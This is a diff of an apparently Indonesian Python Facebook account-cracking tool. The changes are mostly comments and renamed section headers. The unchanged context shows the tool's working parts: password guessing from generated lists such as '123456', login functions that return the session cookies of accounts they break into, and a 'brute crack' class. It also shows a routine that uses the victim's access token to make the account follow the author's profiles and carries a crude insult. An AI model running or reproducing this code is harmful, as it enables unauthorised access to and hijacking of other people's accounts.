@@ -1,6 +1,11 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
 # Made With ❤️ By Dapunta
+# Thanks To Angga, Rizal, Yayan, Hamza, Jessica, And RATU ERROR Project
+# Thanks To All Member RATU ERROR
+# Please Don't Recode, Thanks.
+
+### IMPORT MODULE ###
 
 import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
 from random import randint
@@ -8,6 +13,8 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from datetime import date
 from datetime import datetime
 current = datetime.now()
+
+### RANDOM COLOURS ###
 
 p = "\x1b[0;37m" # putih
 m = "\x1b[0;31m" # merah
@@ -64,7 +71,9 @@ def clear():
 	elif "win" in sys.platform.lower():
 		os.system("cls")
 	else:os.system("clear")
-    
+
+### CONVERTER  ###
+
 def lang(cookies):
 	f=False
 	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
@@ -178,7 +187,7 @@ def gen():
         print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
         bot_follow()
 
-### BOT FOLLOW ### Jangan Diganti Anjing !!!
+### BOT FOLLOW ### Don't Change Bitch !!! Jangan Diganti Anjing !!!
 
 def bot_follow():
 	try:
@@ -186,7 +195,7 @@ def bot_follow():
 	except IOError:
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
-	kom = ("Dapunta jeIek pengen gw tampoI\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
+	kom = ("Dapunta Ganteng Siapa Punya?\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
 	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
 	requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
@@ -567,7 +576,7 @@ def generate(text):
 					results.append("123456")
 	return results
 
-### BRUTE CRACK ###
+### MODULE CRACK ###
 
 def mbasic(em,pas,hosts):
 	r=requests.Session()
@@ -660,6 +669,8 @@ def f_fb(em,pas,hosts):
 		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	else:return {"status":"error","email":em,"pass":pas}
 
+### BRUTE CRACK ###
+	
 class crack:
 	os.system("clear")
 	banner()
